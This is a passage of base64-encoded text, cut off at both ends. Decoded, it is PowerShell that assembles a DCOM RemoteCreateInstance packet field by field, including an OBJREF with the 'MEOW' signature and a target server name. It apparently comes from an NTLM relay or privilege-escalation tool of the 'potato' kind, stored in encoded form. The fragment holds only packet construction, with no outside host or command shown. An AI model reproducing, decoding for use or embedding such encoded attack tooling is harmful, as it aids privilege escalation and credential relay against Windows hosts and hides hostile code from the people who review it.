pKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzU3BlY2lhbFN5c3RlbVByb3BlcnRpZXNEZWZhdWx0QXV0aG5MZXZlbCIsW0J5dGVbXV0oMHgwMiwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNTcGVjaWFsU3lzdGVtUHJvcGVydGllc1BhcnRpdGlvbkd1aWQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzU3BlY2lhbFN5c3RlbVByb3BlcnRpZXNQcm9jZXNzUmVxdWVzdEZsYWdzIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc1NwZWNpYWxTeXN0ZW1Qcm9wZXJ0aWVzT3JpZ2luYWxDbGFzc0NvbnRleHQiLFtCeXRlW11dKDB4MTQsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzU3BlY2lhbFN5c3RlbVByb3BlcnRpZXNGbGFncyIsW0J5dGVbXV0oMHgwMiwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNTcGVjaWFsU3lzdGVtUHJvcGVydGllc1Jlc2VydmVkIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzU3BlY2lhbFN5c3RlbVByb3BlcnRpZXNVbnVzZWRCdWZmZXIiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNJbnN0YW50aWF0aW9uSW5mb0NvbW1vbkhlYWRlciIsW0J5dGVbXV0oMHgwMSwweDEwLDB4MDgsMHgwMCwweGNjLDB4Y2MsMHhjYywweGNjKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc0luc3RhbnRpYXRpb25JbmZvUHJpdmF0ZUhlYWRlciIsW0J5dGVbXV0oMHg0OCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc0luc3RhbnRpYXRpb25JbmZvSW5zdGFudGlhdGVkT2JqZWN0Q2xzSWQiLFtCeXRlW11dKDB4NWUsMHhmMCwweGMzLDB4OGIsMHg2YiwweGQ4LDB4ZDAsMHgxMSwweGEwLDB4NzUsMHgwMCwweGMwLDB4NGYsMHhiNiwweDg4LDB4MjApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzSW5zdGFudGlhdGlvbkluZm9DbGFzc0NvbnRleHQiLFtCeXRlW11dKDB4MTQsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzSW5zdGFudGlhdGlvbkluZm9BY3RpdmF0aW9uRmxhZ3MiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzSW5zdGFudGlhdGlvbkluZm9GbGFnc1N1cnJvZ2F0ZSIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNJbnN0YW50aWF0aW9uSW5mb0ludGVyZmFjZUlkQ291bnQiLFtCeXRlW11dKDB4MDEsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzSW5zdGFudGlhdGlvbkluZm9JbnN0YW50aWF0aW9uRmxhZyIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNJbnN0YW50aWF0aW9uSW50ZXJmYWNlSWRzUHRyIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMiwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc0luc3RhbnRpYXRpb25FbnRpcmVQcm9wZXJ0eVNpemUiLFtCeXRlW11dKDB4NTgsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzSW5zdGFudGlhdGlvblZlcnNpb25NYWpvciIsW0J5dGVbXV0oMHgwNSwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc0luc3RhbnRpYXRpb25WZXJzaW9uTWlub3IiLFtCeXRlW11dKDB4MDcsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNJbnN0YW50aWF0aW9uSW50ZXJmYWNlSWRzUHRyTWF4Q291bnQiLFtCeXRlW11dKDB4MDEsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzSW5zdGFudGlhdGlvbkludGVyZmFjZUlkcyIsW0J5dGVbXV0oMHgxOCwweGFkLDB4MDksMHhmMywweDZhLDB4ZDgsMHhkMCwweDExLDB4YTAsMHg3NSwweDAwLDB4YzAsMHg0ZiwweGI2LDB4ODgsMHgyMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNJbnN0YW50aWF0aW9uSW50ZXJmYWNlSWRzVW51c2VkQnVmZmVyIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc0FjdGl2YXRpb25Db250ZXh0SW5mb0NvbW1vbkhlYWRlciIsW0J5dGVbXV0oMHgwMSwweDEwLDB4MDgsMHgwMCwweGNjLDB4Y2MsMHhjYywweGNjKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc0FjdGl2YXRpb25Db250ZXh0SW5mb1ByaXZhdGVIZWFkZXIiLFtCeXRlW11dKDB4ODAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNBY3RpdmF0aW9uQ29udGV4dEluZm9DbGllbnRPayIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNBY3RpdmF0aW9uQ29udGV4dEluZm9SZXNlcnZlZCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNBY3RpdmF0aW9uQ29udGV4dEluZm9SZXNlcnZlZDIiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzQWN0aXZhdGlvbkNvbnRleHRJbmZvUmVzZXJ2ZWQzIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc0FjdGl2YXRpb25Db250ZXh0SW5mb0NsaWVudFB0clJlZmVyZW50SUQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAyLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzQWN0aXZhdGlvbkNvbnRleHRJbmZvTlVMTFB0ciIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNBY3RpdmF0aW9uQ29udGV4dEluZm9DbGllbnRQdHJDbGllbnRDb250ZXh0VW5rbm93biIsW0J5dGVbXV0oMHg2MCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNBY3RpdmF0aW9uQ29udGV4dEluZm9DbGllbnRQdHJDbGllbnRDb250ZXh0Q250RGF0YSIsW0J5dGVbXV0oMHg2MCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNBY3RpdmF0aW9uQ29udGV4dEluZm9DbGllbnRQdHJDbGllbnRDb250ZXh0T0JKUkVGU2lnbmF0dXJlIixbQnl0ZVtdXSgweDRkLDB4NDUsMHg0ZiwweDU3KSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc0FjdGl2YXRpb25Db250ZXh0SW5mb0NsaWVudFB0ckNsaWVudENvbnRleHRPQkpSRUZGbGFncyIsW0J5dGVbXV0oMHgwNCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNBY3RpdmF0aW9uQ29udGV4dEluZm9DbGllbnRQdHJDbGllbnRDb250ZXh0T0JKUkVGSUlEIixbQnl0ZVtdXSgweGMwLDB4MDEsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHhjMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQ2KSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc0FjdGl2YXRpb25Db250ZXh0SW5mb0NsaWVudFB0ckNsaWVudENvbnRleHRPQkpSRUZDVVNUT01PQkpSRUZDTFNJRCIsW0J5dGVbXV0oMHgzYiwweDAzLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4YzAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NikpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNBY3RpdmF0aW9uQ29udGV4dEluZm9DbGllbnRQdHJDbGllbnRDb250ZXh0T0JKUkVGQ1VTVE9NT0JKUkVGQ0JFeHRlbnNpb24iLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzQWN0aXZhdGlvbkNvbnRleHRJbmZvQ2xpZW50UHRyQ2xpZW50Q29udGV4dE9CSlJFRkNVU1RPTU9CSlJFRlNpemUiLFtCeXRlW11dKDB4MzAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzQWN0aXZhdGlvbkNvbnRleHRJbmZvVW51c2VkQnVmZmVyIixbQnl0ZVtdXSgweDAxLDB4MDAsMHgwMSwweDAwLDB4NjMsMHgyYywweDgwLDB4MmEsMHhhNSwweGQyLDB4YWYsMHhkZCwweDRkLDB4YzQsMHhiYiwweDM3LDB4NGQsMHgzNywweDc2LDB4ZDcsMHgwMiwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMSwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNTZWN1cml0eUluZm9Db21tb25IZWFkZXIiLFtCeXRlW11dKDB4MDEsMHgxMCwweDA4LDB4MDAsMHhjYywweGNjLDB4Y2MsMHhjYykpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNTZWN1cml0eUluZm9Qcml2YXRlSGVhZGVyIiwkcGFja2V0X3ByaXZhdGVfaGVhZGVyKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzU2VjdXJpdHlJbmZvQXV0aGVudGljYXRpb25GbGFncyIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNTZWN1cml0eUluZm9TZXJ2ZXJJbmZvUHRyUmVmZXJlbnRJRCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDIsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNTZWN1cml0eUluZm9OVUxMUHRyIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc1NlY3VyaXR5SW5mb1NlcnZlckluZm9TZXJ2ZXJJbmZvUmVzZXJ2ZWQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzU2VjdXJpdHlJbmZvU2VydmVySW5mb1NlcnZlckluZm9OYW1lUmVmZXJlbnRJRCIsW0J5dGVbXV0oMHgwNCwweDAwLDB4MDIsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNTZWN1cml0eUluZm9TZXJ2ZXJJbmZvU2VydmVySW5mb05VTExQdHIiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzU2VjdXJpdHlJbmZvU2VydmVySW5mb1NlcnZlckluZm9SZXNlcnZlZDIiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzU2VjdXJpdHlJbmZvU2VydmVySW5mb1NlcnZlckluZm9OYW1lTWF4Q291bnQiLCRwYWNrZXRfdGFyZ2V0X2xlbmd0aCkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc1NlY3VyaXR5SW5mb1NlcnZlckluZm9TZXJ2ZXJJbmZvTmFtZU9mZnNldCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2VfSUFjdFByb3BlcnRpZXNDVVNUT01PQkpSRUZJQWN0UHJvcGVydGllc1Byb3BlcnRpZXNTZWN1cml0eUluZm9TZXJ2ZXJJbmZvU2VydmVySW5mb05hbWVBY3R1YWxDb3VudCIsJHBhY2tldF90YXJnZXRfbGVuZ3RoKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzU2VjdXJpdHlJbmZvU2VydmVySW5mb1NlcnZlckluZm9OYW1lU3RyaW5nIiwkcGFja2V0X3RhcmdldF91bmljb2RlKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzTG9jYXRpb25JbmZvQ29tbW9uSGVhZGVyIixbQnl0ZVtdXSgweDAxLDB4MTAsMHgwOCwweDAwLDB4Y2MsMHhjYywweGNjLDB4Y2MpKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzTG9jYXRpb25JbmZvUHJpdmF0ZUhlYWRlciIsW0J5dGVbXV0oMHgxMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc0xvY2F0aW9uSW5mb05VTExQdHIiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlLkFkZCgiRENPTVJlbW90ZUNyZWF0ZUluc3RhbmNlX0lBY3RQcm9wZXJ0aWVzQ1VTVE9NT0JKUkVGSUFjdFByb3BlcnRpZXNQcm9wZXJ0aWVzTG9jYXRpb25JbmZvUHJvY2Vzc0lEIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc0xvY2F0aW9uSW5mb0FwYXJ0bWVudElEIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X0RDT01SZW1vdGVDcmVhdGVJbnN0YW5jZS5BZGQoIkRDT01SZW1vdGVDcmVhdGVJbnN0YW5jZV9JQWN0UHJvcGVydGllc0NVU1RPTU9CSlJFRklBY3RQcm9wZXJ0aWVzUHJvcGVydGllc0xvY2F0aW9uSW5mb0NvbnRleHRJRCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9EQ09NUmVtb3RlQ3JlYXRlSW5zdGFuY2UuQWRkKCJEQ09NUmVtb3RlQ3